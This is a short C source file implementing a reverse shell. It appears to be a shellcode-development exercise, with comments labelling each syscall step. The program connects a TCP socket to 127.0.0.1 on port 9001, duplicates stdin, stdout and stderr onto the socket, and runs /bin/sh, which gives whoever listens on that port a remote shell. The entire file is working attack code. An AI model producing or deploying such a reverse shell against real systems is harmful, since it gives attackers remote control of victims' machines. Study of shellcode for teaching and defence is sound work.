#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    int sockfd;
	int port = 9001;

	// Address struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port); 
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

   	// 1) Socket Syscall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // 2) Connect Syscall
    connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
    
    // 3) Dup2 Syscall
    dup2(sockfd, 0);    //stdin
    dup2(sockfd, 1);    //stdout
    dup2(sockfd, 2);    //stderr

    // 4) Execve Syscall
    execve("/bin/sh", NULL, NULL);
    return 0;
}
